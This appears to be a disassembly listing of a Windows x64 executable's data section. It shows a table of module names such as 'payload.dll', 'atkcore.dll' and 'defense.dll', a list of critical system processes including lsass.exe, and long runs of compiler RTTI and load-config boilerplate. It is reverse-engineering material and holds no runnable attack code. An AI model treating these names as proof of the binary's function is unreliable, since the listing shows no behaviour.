lpString2 dq offset aSvcguardDll ; "svcguard.dll"
; const LPCWSTR off_140009230
off_140009230 dq offset aWindowDll ; "window.dll"
; const LPCWSTR off_140009238
off_140009238 dq offset aAtkcoreDll ; "atkcore.dll"
; const LPCWSTR off_140009240
off_140009240 dq offset aPayloadDll ; "payload.dll"
; const LPCWSTR off_140009248
off_140009248 dq offset aDefenseDll ; "defense.dll"
; const LPCWSTR off_140009250
off_140009250 dq offset aDeamonwindowsD ; "DeamonWindows.dll"
; const LPCWSTR off_140009258
off_140009258 dq offset aDeamonDll ; "deamon.dll"
dq offset String2       ; "lenovo_fix.exe"
dq offset SubStr        ; "yyguard.dll"
unk_140009270 db    0
db    0
db    0
db    0
db  88h
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
off_140009280 dq offset aSystem ; "System"
dq offset aSmssExe      ; "smss.exe"
dq offset aCsrssExe     ; "csrss.exe"
dq offset aWininitExe   ; "wininit.exe"
dq offset aServicesExe  ; "services.exe"
dq offset aLsassExe     ; "lsass.exe"
dq offset aWinlogonExe  ; "winlogon.exe"
dq offset aSpoolsvExe   ; "spoolsv.exe"
dq offset aDwmExe       ; "dwm.exe"
dq offset aTaskhostExe  ; "taskhost.exe"
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
dq offset ??_R4?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::stringbuf::`RTTI Complete Object Locator'
; const std::basic_stringbuf<char, struct std::char_traits<char>, class std::allocator<char>>::`vftable'
??_7?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ dq offset sub_140005B40
dq offset ?_Lock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAAXXZ ; std::streambuf::_Lock(void)
dq offset ?_Unlock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAAXXZ ; std::streambuf::_Unlock(void)
dq offset sub_1400057E0
dq offset sub_140005780
dq offset ?showmanyc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAA_JXZ ; std::streambuf::showmanyc(void)
dq offset sub_140005720
dq offset ?uflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAHXZ ; std::streambuf::uflow(void)
dq offset ?xsgetn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAA_JPEAD_J@Z ; std::streambuf::xsgetn(char *,__int64)
dq offset ?xsputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAA_JPEBD_J@Z ; std::streambuf::xsputn(char const *,__int64)
dq offset sub_140005580
dq offset sub_140005450
dq offset ?setbuf@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAPEAV12@PEAD_J@Z ; std::streambuf::setbuf(char *,__int64)
dq offset ?sync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAHXZ ; std::streambuf::sync(void)
dq offset ?imbue@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAXAEBVlocale@2@@Z ; std::streambuf::imbue(std::locale const &)
dq offset ??_R4?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`RTTI Complete Object Locator'
; const std::basic_stringstream<char, struct std::char_traits<char>, class std::allocator<char>>::`vftable'
??_7?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ dq offset sub_140006220
align 10h
a00010203040506 db '00010203040506070809101112131415161'
db '71819202122232425262728293031323334'
db '35363738394041424344454647484950515'
db '25354555657585960616263646566676869'
db '70717273747576777879808182838485868'
db '7888990919293949596979899',0
align 4
db  98h
db    0
db    0
db    0
_load_config_used dd 140h ; Size
dd 0                    ; Time stamp
dw 2 dup(0)             ; Version: 0.0
dd 0                    ; GlobalFlagsClear
dd 0                    ; GlobalFlagsSet
dd 0                    ; CriticalSectionDefaultTimeout
dq 0                    ; DeCommitFreeBlockThreshold
dq 0                    ; DeCommitTotalFreeThreshold
dq 0                    ; LockPrefixTable
dq 0                    ; MaximumAllocationSize
dq 0                    ; VirtualMemoryThreshold
dq 0                    ; ProcessAffinityMask
dd 0                    ; ProcessHeapFlags
dw 0                    ; CSDVersion
dw 0                    ; Reserved1
dq 0                    ; EditList
dq offset __security_cookie ; SecurityCookie
dq 0                    ; SEHandlerTable
dq 0                    ; SEHandlerCount
dq offset __guard_check_icall_fptr ; GuardCFCheckFunctionPointer
dq offset __guard_dispatch_icall_fptr ; GuardCFDispatchFunctionPointer
dq 0                    ; GuardCFFunctionTable
dq 0                    ; GuardCFFunctionCount
dd 100h                 ; GuardFlags
dw 0                    ; CodeIntegrity.Flags
dw 0                    ; CodeIntegrity.Catalog
dd 0                    ; CodeIntegrity.CatalogOffset
dd 0                    ; CodeIntegrity.Reserved
dq 0                    ; GuardAddressTakenIatEntryTable
dq 0                    ; GuardAddressTakenIatEntryCount
dq 0                    ; GuardLongJumpTargetTable
dq 0                    ; GuardLongJumpTargetCount
dq 0                    ; DynamicValueRelocTable
dq 0                    ; CHPEMetadataPointer
dq 0                    ; GuardRFFailureRoutine
dq 0                    ; GuardRFFailureRoutineFunctionPointer
dd 0                    ; DynamicValueRelocTableOffset
dw 0                    ; DynamicValueRelocTableSection
dw 0                    ; Reserved2
dq 0                    ; GuardRFVerifyStackPointerFunctionPointer
dd 0                    ; HotPatchTableOffset
dd 0                    ; Reserved3
dq 0                    ; EnclaveConfigurationPointer
dq offset __volatile_metadata ; VolatileMetadataPointer
dq 0                    ; GuardEHContinuationTable
dq 0                    ; GuardEHContinuationCount
dq offset __guard_xfg_check_icall_fptr ; GuardXFGCheckFunctionPointer
dq offset __guard_xfg_dispatch_icall_fptr ; GuardXFGDispatchFunctionPointer
dq offset __guard_xfg_table_dispatch_icall_fptr ; GuardXFGTableDispatchFunctionPointer
dq offset __castguard_check_failure_os_handled_fptr ; CastGuardOsDeterminedFailureMode
dq offset off_140008550
; Debug Directory entries
dd 0                    ; Characteristics
dd 6AD385EFh            ; TimeDateStamp: Sat Oct 17 14:27:59 2026
dw 0                    ; MajorVersion
dw 0                    ; MinorVersion
dd 2                    ; Type: IMAGE_DEBUG_TYPE_CODEVIEW
dd 5Eh                  ; SizeOfData
dd rva asc_140009D10    ; AddressOfRawData
dd 8510h                ; PointerToRawData
dd 0                    ; Characteristics
dd 6AD385EFh            ; TimeDateStamp: Sat Oct 17 14:27:59 2026
dw 0                    ; MajorVersion
dw 0                    ; MinorVersion
dd 0Ch                  ; Type: IMAGE_DEBUG_TYPE_VC_FEATURE
dd 14h                  ; SizeOfData
dd rva unk_140009D70    ; AddressOfRawData
dd 8570h                ; PointerToRawData
dd 0                    ; Characteristics
dd 6AD385EFh            ; TimeDateStamp: Sat Oct 17 14:27:59 2026
dw 0                    ; MajorVersion
dw 0                    ; MinorVersion
dd 0Dh                  ; Type: IMAGE_DEBUG_TYPE_POGO
dd 2D0h                 ; SizeOfData
dd rva aGctl            ; AddressOfRawData
dd 8584h                ; PointerToRawData
dd 0                    ; Characteristics
dd 6AD385EFh            ; TimeDateStamp: Sat Oct 17 14:27:59 2026
dw 0                    ; MajorVersion
dw 0                    ; MinorVersion
dd 0Eh                  ; Type: IMAGE_DEBUG_TYPE_ILTCG
dd 0                    ; SizeOfData
dd 0                    ; AddressOfRawData
dd 0                    ; PointerToRawData
align 20h
; const type_info::`RTTI Complete Object Locator'
??_R4type_info@@6B@ dd 1 ; signature
dd 0                    ; offset of this vtable in complete class (from top)
dd 0                    ; offset of constructor displacement
dd rva ??_R0?AVtype_info@@@8 ; reference to type description
dd rva ??_R3type_info@@8 ; reference to hierarchy description
dd rva ??_R4type_info@@6B@ ; reference to object's base
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; type_info::`RTTI Class Hierarchy Descriptor'
??_R3type_info@@8 dd 0  ; signature
dd 0                    ; attributes
dd 1                    ; # of items in the array of base classes
dd rva ??_R2type_info@@8 ; reference to the array of base classes
align 20h
; type_info::`RTTI Base Class Array'
??_R2type_info@@8 dd rva ??_R1A@?0A@EA@type_info@@8 ; reference to base class decription 1
align 10h
; type_info::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@type_info@@8 dd rva ??_R0?AVtype_info@@@8 ; reference to type description
dd 0                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3type_info@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_istream<char, struct std::char_traits<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 4                    ; # of items in the array of base classes
dd rva ??_R2?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; reference to the array of base classes
align 10h
; std::basic_iostream<char, struct std::char_traits<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8 dd 0 ; signature
dd 3                    ; attributes
dd 9                    ; # of items in the array of base classes
dd rva ??_R2?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; reference to the array of base classes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; const std::exception::`RTTI Complete Object Locator'
??_R4exception@std@@6B@ dd 1 ; signature
dd 0                    ; offset of this vtable in complete class (from top)
dd 0                    ; offset of constructor displacement
dd rva ??_R0?AVexception@std@@@8 ; reference to type description
dd rva ??_R3exception@std@@8 ; reference to hierarchy description
dd rva ??_R4exception@std@@6B@ ; reference to object's base
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::bad_array_new_length::`RTTI Base Class Array'
??_R2bad_array_new_length@std@@8 dd rva ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; reference to base class decription 1
dd rva ??_R1A@?0A@EA@bad_alloc@std@@8 ; reference to base class decription 2
dd rva ??_R1A@?0A@EA@exception@std@@8 ; reference to base class decription 3
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_istream<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 3                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::bad_alloc::`RTTI Base Class Array'
??_R2bad_alloc@std@@8 dd rva ??_R1A@?0A@EA@bad_alloc@std@@8 ; reference to base class decription 1
dd rva ??_R1A@?0A@EA@exception@std@@8 ; reference to base class decription 2
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_stringbuf<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Base Class Array'
??_R2?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to base class decription 1
dd rva ??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 2
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::_Iosb<int>::`RTTI Base Class Descriptor at (8, 0, 4, 64)'
??_R17A@3EA@?$_Iosb@H@std@@8 dd rva ??_R0?AV?$_Iosb@H@std@@@8 ; reference to type description
dd 0                    ; # of sub elements within base class array
dd 8                    ; member displacement
dd 0                    ; vftable displacement
dd 4                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$_Iosb@H@std@@8 ; reference to class hierarchy descriptor
align 10h
; std::basic_stringstream<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 dd rva ??_R0?AV?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@8 ; reference to type description
dd 9                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::exception::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@exception@std@@8 dd rva ??_R0?AVexception@std@@@8 ; reference to type description
dd 0                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3exception@std@@8 ; reference to class hierarchy descriptor
align 20h
; std::basic_streambuf<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 0                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::bad_alloc::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@bad_alloc@std@@8 dd rva ??_R0?AVbad_alloc@std@@@8 ; reference to type description
dd 1                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3bad_alloc@std@@8 ; reference to class hierarchy descriptor
align 10h
; std::basic_istream<char, struct std::char_traits<char>>::`RTTI Base Class Array'
??_R2?$basic_istream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 1
dd rva ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 2
dd rva ??_R1A@A@3EA@ios_base@std@@8 ; reference to base class decription 3
dd rva ??_R17A@3EA@?$_Iosb@H@std@@8 ; reference to base class decription 4
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_stringbuf<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 2                    ; # of items in the array of base classes
dd rva ??_R2?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to the array of base classes
align 10h
; std::exception::`RTTI Base Class Array'
??_R2exception@std@@8 dd rva ??_R1A@?0A@EA@exception@std@@8 ; reference to base class decription 1
align 20h
; std::basic_ostream<char, struct std::char_traits<char>>::`RTTI Base Class Array'
??_R2?$basic_ostream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 1
dd rva ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 2
dd rva ??_R1A@A@3EA@ios_base@std@@8 ; reference to base class decription 3
dd rva ??_R17A@3EA@?$_Iosb@H@std@@8 ; reference to base class decription 4
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_ios<char, struct std::char_traits<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 3                    ; # of items in the array of base classes
dd rva ??_R2?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to the array of base classes
align 20h
; std::basic_ostream<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (16, -1, 0, 64)'
??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 3                    ; # of sub elements within base class array
dd 16                   ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::ios_base::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@ios_base@std@@8 dd rva ??_R0?AVios_base@std@@@8 ; reference to type description
dd 1                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3ios_base@std@@8 ; reference to class hierarchy descriptor
align 10h
; std::exception::`RTTI Class Hierarchy Descriptor'
??_R3exception@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 1                    ; # of items in the array of base classes
dd rva ??_R2exception@std@@8 ; reference to the array of base classes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_ostream<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 3                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
align 10h
; std::basic_streambuf<char, struct std::char_traits<char>>::`RTTI Base Class Array'
??_R2?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 1
align 20h
; std::_Iosb<int>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$_Iosb@H@std@@8 dd rva ??_R0?AV?$_Iosb@H@std@@@8 ; reference to type description
dd 0                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$_Iosb@H@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_stringbuf<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 dd rva ??_R0?AV?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@8 ; reference to type description
dd 1                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to class hierarchy descriptor
align 10h
; std::basic_iostream<char, struct std::char_traits<char>>::`RTTI Base Class Array'
??_R2?$basic_iostream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 1
dd rva ??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 2
dd rva ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 3
dd rva ??_R1A@A@3EA@ios_base@std@@8 ; reference to base class decription 4
dd rva ??_R17A@3EA@?$_Iosb@H@std@@8 ; reference to base class decription 5
dd rva ??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 6
dd rva ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 7
dd rva ??_R1A@A@3EA@ios_base@std@@8 ; reference to base class decription 8
dd rva ??_R17A@3EA@?$_Iosb@H@std@@8 ; reference to base class decription 9
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; const std::bad_alloc::`RTTI Complete Object Locator'
??_R4bad_alloc@std@@6B@ dd 1 ; signature
dd 0                    ; offset of this vtable in complete class (from top)
dd 0                    ; offset of constructor displacement
dd rva ??_R0?AVbad_alloc@std@@@8 ; reference to type description
dd rva ??_R3bad_alloc@std@@8 ; reference to hierarchy description
dd rva ??_R4bad_alloc@std@@6B@ ; reference to object's base
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_stringstream<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Base Class Array'
??_R2?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to base class decription 1
dd rva ??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 2
dd rva ??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 3
dd rva ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 4
dd rva ??_R1A@A@3EA@ios_base@std@@8 ; reference to base class decription 5
dd rva ??_R17A@3EA@?$_Iosb@H@std@@8 ; reference to base class decription 6
dd rva ??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 7
dd rva ??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 8
dd rva ??_R1A@A@3EA@ios_base@std@@8 ; reference to base class decription 9
dd rva ??_R17A@3EA@?$_Iosb@H@std@@8 ; reference to base class decription 10
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
??_R3bad_array_new_length@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 3                    ; # of items in the array of base classes
dd rva ??_R2bad_array_new_length@std@@8 ; reference to the array of base classes
align 20h
; const std::basic_stringbuf<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Complete Object Locator'
??_R4?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ dd 1 ; signature
dd 0                    ; offset of this vtable in complete class (from top)
dd 0                    ; offset of constructor displacement
dd rva ??_R0?AV?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@8 ; reference to type description
dd rva ??_R3?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to hierarchy description
dd rva ??_R4?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; reference to object's base
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; const std::basic_stringstream<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Complete Object Locator'
??_R4?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ dd 1 ; signature
dd 152                  ; offset of this vtable in complete class (from top)
dd 4                    ; offset of constructor displacement
dd rva ??_R0?AV?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@8 ; reference to type description
dd rva ??_R3?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to hierarchy description
dd rva ??_R4?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; reference to object's base
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
??_R3bad_alloc@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 2                    ; # of items in the array of base classes
dd rva ??_R2bad_alloc@std@@8 ; reference to the array of base classes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_ios<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (0, 0, 4, 80)'
??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 2                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd 0                    ; vftable displacement
dd 4                    ; displacement within vftable
dd 50h                  ; base class attributes
dd rva ??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
align 10h
; const std::bad_array_new_length::`RTTI Complete Object Locator'
??_R4bad_array_new_length@std@@6B@ dd 1 ; signature
dd 0                    ; offset of this vtable in complete class (from top)
dd 0                    ; offset of constructor displacement
dd rva ??_R0?AVbad_array_new_length@std@@@8 ; reference to type description
dd rva ??_R3bad_array_new_length@std@@8 ; reference to hierarchy description
dd rva ??_R4bad_array_new_length@std@@6B@ ; reference to object's base
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::ios_base::`RTTI Base Class Array'
??_R2ios_base@std@@8 dd rva ??_R1A@?0A@EA@ios_base@std@@8 ; reference to base class decription 1
dd rva ??_R17?0A@EA@?$_Iosb@H@std@@8 ; reference to base class decription 2
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_ostream<char, struct std::char_traits<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 4                    ; # of items in the array of base classes
dd rva ??_R2?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; reference to the array of base classes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_iostream<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 8                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
align 10h
; std::ios_base::`RTTI Class Hierarchy Descriptor'
??_R3ios_base@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 2                    ; # of items in the array of base classes
dd rva ??_R2ios_base@std@@8 ; reference to the array of base classes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_streambuf<char, struct std::char_traits<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 1                    ; # of items in the array of base classes
dd rva ??_R2?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; reference to the array of base classes
align 20h
; std::bad_array_new_length::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@bad_array_new_length@std@@8 dd rva ??_R0?AVbad_array_new_length@std@@@8 ; reference to type description
dd 2                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3bad_array_new_length@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
